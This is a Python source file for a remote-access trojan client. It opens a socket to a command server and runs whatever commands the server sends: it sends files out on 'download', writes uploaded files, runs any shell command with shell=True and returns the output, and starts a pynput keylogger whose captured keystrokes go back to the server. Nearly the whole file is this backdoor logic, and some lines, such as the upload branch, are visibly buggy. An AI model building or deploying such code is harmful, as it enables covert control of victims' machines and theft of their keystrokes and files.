from asyncio import subprocess
from concurrent.futures import thread
import msilib
from platform import release
from posixpath import split
from pydoc import cli
import socket
import subprocess
from pathlib import Path
from pynput.keyboard import Key,Listener
import threading

ip = '127.0.0.1'
port = 9001

sock_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock_client.connect((ip, port))

msg = 'TEST'
sock_client.send(msg.encode())
msg = sock_client.recv(2048).decode()

global allkeys
allkeys = ''
keylog_mode = 0

def pressed(key):
	global allkeys
	allkeys+=str(key)

def released(key):
	pass

def keylog():
	global l
	l = Listener(on_press=pressed, on_release=released)
	l.start()
	# msg = "Keylogger Results: "
	# sock_client.send(msg.encode())

while msg != 'quit':
	fullmsg = msg
	msg = list(msg.split(" "))

	if msg[0] == 'download':
		filename = msg[1]
		f = open(filename, 'rb')
		contents = f.read()
		f.close()
		sock_client.send(contents)
		msg = sock_client.recv(2048).decode()

	elif msg[0] == 'upload':
		filename = msg[1]
		filesize = int(msg[2])
		sock_client.recv(filesize)
		contents = open(Path(filename), 'wb')
		f.write(contents)
		f.close()
		sock_client.send('File Transferred Successfully :)').encode()
		msg = sock_client.recv(2048).decode()

	elif fullmsg == "keylog on":
		keylog_mode = 0
		t1 = threading.Thread(target= keylog)
		t1.start()
		msg = "Keylogger Started Successfully."
		sock_client.send(msg.encode())
		msg = sock_client.recv(2048).decode()
	
	elif fullmsg == "keylog off":
		l.stop()
		t1.join()
		#global allkeys
		sock_client.send(allkeys.encode())
		allkeys = ''
		msg = sock_client.recv(2048).decode()

	else:
		p = subprocess.Popen(
			msg, stdout = subprocess.PIPE,
			stderr = subprocess.PIPE,
			shell = True
		)
		output, error = p.communicate()

		if len(output) > 0:
			msg = str(output.decode())

		else:
			msg = str(error.decode())
			
		sock_client.send(msg.encode())
		msg = sock_client.recv(2048).decode()
		# msg = input("Enter your message: ")
		# print(msg)
sock_client.close()